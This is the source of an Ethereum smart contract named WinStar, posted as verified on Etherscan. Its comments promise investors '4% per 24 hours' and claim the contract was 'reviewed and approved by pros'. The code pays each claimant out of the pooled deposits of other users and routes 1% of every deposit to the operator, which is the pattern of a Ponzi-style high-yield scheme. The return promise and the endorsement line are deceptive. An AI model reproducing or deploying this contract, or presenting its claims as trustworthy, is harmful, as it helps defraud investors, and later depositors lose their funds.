/**
 *Submitted for verification at Etherscan.io on 2019-10-20
*/

pragma solidity ^0.5.0;

/**
 * @dev GAIN 4% PER 24 HOURS (every 5900 blocks)
 *
 * - url:  https://winstar.me
 * - ipfs: https://gotowin.eth.link
 *
 * - team: ID9527
 * - ens: gotowin.eth
 *
 * How to use:
 *
 * 1. investment
 *   - a. Send any amount of ether to make an investment
 * 2. profit
 *   - a. Claim your profit by sending 0 ether transaction (every day or every week)
 *   - b. Send more ether to reinvest AND get your profit at the same time
 *
 * Tip: Contract reviewed and approved by pros!
 *
 */
contract WinStar {
    // records amounts invested
    mapping (address => uint256) invested;
    // records blocks at which investments were made
    mapping (address => uint256) atBlock;
    // operator address
    address payable private operator;

    // contract initialization: set operator
    constructor() public {
        operator = msg.sender;
    }

    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * 4% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 4 / 100 * (block.number - atBlock[msg.sender]) / 5900;

            // send calculated amount of ether directly to sender (aka YOU)
            msg.sender.transfer(amount);
        }

        // investment amount 1% as a development team incentive and operating cost
        if (msg.value != 0) {
            operator.transfer(msg.value / 100);
        }

        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
    }
}